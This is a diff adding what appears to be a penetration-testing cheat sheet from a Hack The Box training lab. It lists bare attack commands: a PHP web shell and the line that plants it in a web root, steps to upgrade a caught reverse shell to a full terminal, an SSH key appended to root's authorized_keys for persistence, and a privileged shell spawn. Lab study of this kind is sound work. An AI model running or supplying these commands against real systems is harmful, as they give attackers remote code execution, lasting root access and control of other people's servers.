@@ -1,0 +1,36 @@
+<?PHP system($_GET['cmd']);?>
+
+echo "<?PHP system(\$_GET['cmd']);?>" > /var/www/html/shell.php
+
+
+----------------
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+python3 -c 'import pty; pty.spawn("/bin/sh")'
+
+www-data@remotehost$ ^Z
+
+maroz980@htb[/htb]$ stty raw -echo; fg
+
+[Enter]
+[Enter]
+www-data@remotehost$
+
+
+echo $TERM
+
+maroz980@htb[/htb]$ stty size
+
+		67 318
+
+www-data@remotehost$ export TERM=xterm-256color
+
+www-data@remotehost$ stty rows 39 columns 168
+
+---------------
+
+echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys
+
+python3 -m http.server 8000
+
+python3 -c 'import os;os.system("/bin/sh -p")'
